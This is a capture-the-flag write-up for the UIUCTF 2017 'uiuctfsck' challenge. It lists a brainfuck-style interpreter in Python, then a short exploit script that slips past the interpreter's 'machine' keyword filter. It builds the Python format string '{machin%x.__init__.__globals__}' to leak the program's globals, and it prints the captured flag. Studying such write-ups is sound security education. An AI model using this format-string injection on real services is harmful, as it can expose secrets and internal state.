---
layout: post
title: "[UIUCTF2k17] Reverse 200 - uiuctfsck"
categories: writeup
---
States:
```
This service looks like it might have some vulnerabilities. Think you can get the flag?

nc challenge.uiuc.tf 11338
```

Here is the interpreter.py script behind the TCP service: 

```python
from flag import flag

memory_size = 255

class StackMachine(object):
    def __init__(self):
        self.memory = [0 for _k in range(memory_size)]
        self.data_pointer = 0

    def memory_as_string(self):
        out = ""
        for k in self.memory[self.data_pointer:]:
            if(k == 0):
                return out
            out += chr(k)
        return out

    def mem_at(self, index):
        if(index < 0 or index >= memory_size):
            return 0
        return self.memory[index]

    def increment(self):
        self.memory[self.data_pointer] = min(memory_size, self.memory[self.data_pointer] + 1)

    def decrement(self):
        self.memory[self.data_pointer] = max(0, self.memory[self.data_pointer] - 1)

    def move_left(self):
        self.data_pointer = max(0, self.data_pointer - 1)

    def move_right(self):
        self.data_pointer = min(memory_size, self.data_pointer + 1)

def printf(stack_machine):
    """Rudimentary printf function.
    %xi: get the byte in memory at the address specified by [data_pointer - 1]
    %x: get the data pointer as a hex string
    %s: get the memory of the stack machine specified by [data_pointer - 1], represented as a string.
    """
    format_string = stack_machine.memory_as_string()

    if("machine" in format_string):
        print("No Direct Memory Access! Bad!")
        return

    format_string = format_string.replace('%xi', hex(stack_machine.mem_at(stack_machine.mem_at(stack_machine.data_pointer - 1)))[2:])

    format_string = format_string.replace('%x', hex(stack_machine.data_pointer)[2:])
    format_string = format_string.replace('%s', machines[stack_machine.mem_at(stack_machine.data_pointer - 1)].memory_as_string())

    format_string = format_string.replace("\\n", "\n")
    format_string = format_string.replace("\\t", "\t")

    out = "{machine.data_pointer}: " + format_string
    print(out.format(machine=stack_machine))

def inc(state, _context):
    machines[state['machine']].increment()
def dec(state, _context):
    machines[state['machine']].decrement()
def shl(state, _context):
    machines[state['machine']].move_left()
def shr(state, _context):
    machines[state['machine']].move_right()
def jumpr(state, _context):
    m = machines[state['machine']]
    if(m.mem_at(m.data_pointer) == 0):
        step = state['ip']
        num_rb_needed = 1
        while(step < memory_size):
            step += 1
            if(_context[step] == '['):
                num_rb_needed += 1
            if(_context[step] == ']'):
                num_rb_needed -= 1
            if(num_rb_needed == 0):
                break
        state['ip'] = step
def jumpl(state, _context):
    m = machines[state['machine']]
    if(m.mem_at(m.data_pointer) != 0):
        step = state['ip']
        while(step > 0):
            step -= 1
            if(_context[step] == ']'):
                num_lb_needed += 1
            if(_context[step] == '['):
                num_lb_needed -= 1
            if(num_lb_needed == 0):
                break
        state['ip'] = step
def lastm(state, _context):
    state['machine'] = max(0, state['machine'] - 1)
def nextm(state, _context):
    state['machine'] = min(memory_size, state['machine'] + 1)
def out(state, _context):
    printf(machines[state['machine']])
def debug(state, _context):
    m = machines[state['machine']]
    print("Program:", _context)
    print("IP:", state['ip'])
    print("Machine:", state['machine'])
    print("Machine State:")
    print("\tData Pointer:", m.data_pointer)
    print("\tMemory:")
    for i in range(memory_size):
        print("\t\t", m.mem_at(i), "\t\t", chr(m.mem_at(i)))

machines = [StackMachine() for _k in range(memory_size)]
operations = {
    '+': inc,
    '-': dec,
    '<': shl,
    '>': shr,
    '[': jumpr,
    ']': jumpl,
    '(': lastm,
    ')': nextm,
    '.': out,
    'D': debug # you're welcome
}

def interpret_program(program_string):
    timeout = 8192
    state = {'machine': 0, 'ip': 0}

    while(state['ip'] < len(program_string) and timeout > 0):
        try:
            c = program_string[state['ip']]
            if c in operations.keys():
                    operations[c](state, program_string)
        except Exception as e:
            print("Well, you managed to break it...")
            print(e)
        state['ip'] += 1
        timeout -= 1

    if(timeout == 0):
        print("You used too many cycles. Sorry.")

if(__name__ == '__main__'):
    while(True):
        command = input("> ")
        if(command == "exit"):
            exit(0)
        interpret_program(command)
```

It's a simple brainfuck interpreter.

Because of those instructions we can think that this script has no string format vulnerabilties.

```python
if("machine" in format_string):
  print("No Direct Memory Access! Bad!")
  return
```

But thanks to the implementation of a rudimentary printf function we can modify the string after
this verification.

This lead us to the creation of this exploit:

```python
string = "{machin%x.__init__.__globals__}"

out = ""

out += ">" * 0xe

for char in string:
    out += "+" * ord(char)
    out += ">"

out += "<" * len(string)

out += "."

print(out)
```

Flag:
`flag{w3lcome_2_N3w_Y0rk}`

the_unknown_
